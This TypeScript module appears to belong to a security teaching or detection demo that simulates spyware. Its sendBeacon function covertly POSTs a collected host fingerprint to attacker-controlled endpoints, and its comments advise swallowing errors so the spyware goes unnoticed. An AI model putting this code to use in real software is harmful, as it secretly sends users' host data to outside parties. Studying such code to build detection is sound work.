import { readFileSync } from "node:fs";
import https from "node:https";
import type { HostFingerprint } from "../fingerprint.js";
import type { Logger } from "../logger.js";

// SUSPICIOUS STEP: the exfiltration, run from the spawned helper process.
//
// Covertly POST the host fingerprint to attacker-controlled endpoints. The
// traffic is ordinary HTTPS and stays encrypted end to end — nothing decrypts
// it here. The kernel sensor still sees WHICH process opened the connection and
// to WHERE, which is the whole lesson.
export async function sendBeacon(
  url: string,
  fingerprint: HostFingerprint,
  caPath: string,
  logger: Logger,
): Promise<void> {
  try {
    logger.info({ url }, "Beaconing host fingerprint...");
    await postJson(url, JSON.stringify(fingerprint), caPath);
    logger.info({ url }, "Beaconing host fingerprint succeeded.");
  } catch (err) {
    // Spyware never lets itself crash the host application — that would get it
    // noticed. Swallow the failure and move on to the next sink.
    logger.warn({ err, url }, "Beaconing host fingerprint failed.");
  }
}

export function postJson(url: string, body: string, caPath: string): Promise<void> {
  let ca: Buffer | undefined;
  try {
    ca = readFileSync(caPath);
  } catch {
    ca = undefined;
  }
  return new Promise((resolve, reject) => {
    const req = https.request(
      url,
      {
        method: "POST",
        timeout: 5000,
        ca,
        headers: {
          "content-type": "application/json",
          "content-length": Buffer.byteLength(body),
        },
      },
      (res) => {
        res.on("data", () => {});
        res.on("end", () => resolve());
      },
    );
    req.on("error", reject);
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.end(body);
  });
}
